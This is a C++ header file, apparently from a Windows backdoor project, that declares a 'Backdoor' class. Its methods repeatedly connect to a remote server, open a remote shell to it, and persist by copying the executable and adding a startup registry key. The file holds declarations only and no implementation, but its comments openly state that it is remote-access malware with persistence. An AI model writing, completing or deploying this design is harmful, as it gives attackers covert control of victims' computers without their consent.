/**
 * @file "backdoor.h"
 * @version 1.0.0
 * 
 * @copyright (C) 2022 lost-century/~backdoor. all rights reserved
*/

#ifndef LIB_BACKDOOR

#define LIB_BACKDOOR

#define _WIN32_WINNT 0x501

#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>

#define RECV_BUFFER_LEN 512
#define CMD_BUFFER_LEN 4097

/**
 * @class Backdoor()
 * @author le01q
*/

class Backdoor
{
      Backdoor();

      static Backdoor* instance;
      SOCKET OnConnectSocket;
      void log(std::string line);

      public:

            ~Backdoor();

            static Backdoor* getInstance();

            // This tries connect to the server until it suceeds :-)
            void OnServerConnection(std::string ip, std::string port);

            // Open a remote shell to the servers
            void OnShellOpen(int argc, TCHAR *argv[]);

            // Copies .exe file and add registry key to launched at startup
            void persist(std::string *programName);
};

#endif
